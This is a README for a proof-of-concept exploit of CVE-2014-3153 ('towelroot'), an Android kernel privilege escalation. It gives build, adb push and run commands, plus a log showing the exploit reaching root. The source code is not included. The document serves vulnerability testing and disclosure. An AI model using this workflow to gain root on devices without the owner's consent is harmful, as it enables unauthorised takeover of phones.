CVE-2014-3153
=============

This is a proof of concept for CVE-2014-3153 aka towelroot.

newroot.c is a combination of http://pastebin.com/A0PzPKnM and https://gist.githubusercontent.com/fi01/a838dea63323c7c003cd/raw/bef447b6accd49d81d45147ec9f36f5216e65c68/cube-towel.c editted for readability.

To test, connect your phone via adb and type "make test":

```
$ make test
ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk
make[1]: Entering directory `/home/dev/git/CVE-2014-3153'
[armeabi] Install        : newroot => libs/armeabi/newroot
make[1]: Leaving directory `/home/dev/git/CVE-2014-3153'
adb push libs/armeabi/newroot /data/local/tmp/newroot
447 KB/s (21836 bytes in 0.047s)
adb shell "cd /data/local/tmp; ./newroot id"
running with pid 4514
i have a client like hookers.
starting the dangerous things
0xdb99a000 is a good number
cpid1 resumed
0xdbab1d94 is also a good number.
cpid3 resumed.
GOING
addr_limit: 0xd8662008
hack.
task_security_struct: 0xc5b86c00
uid=0(root) gid=0(root) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:kernel:s0
Finished, looping.
wait 10 seconds...
rebooting...
```

If you see uid=0(root) gid=0(root) the exploit has succeeded.
If your phone reboots, your device is vulnerable but the exploit may have failed. 
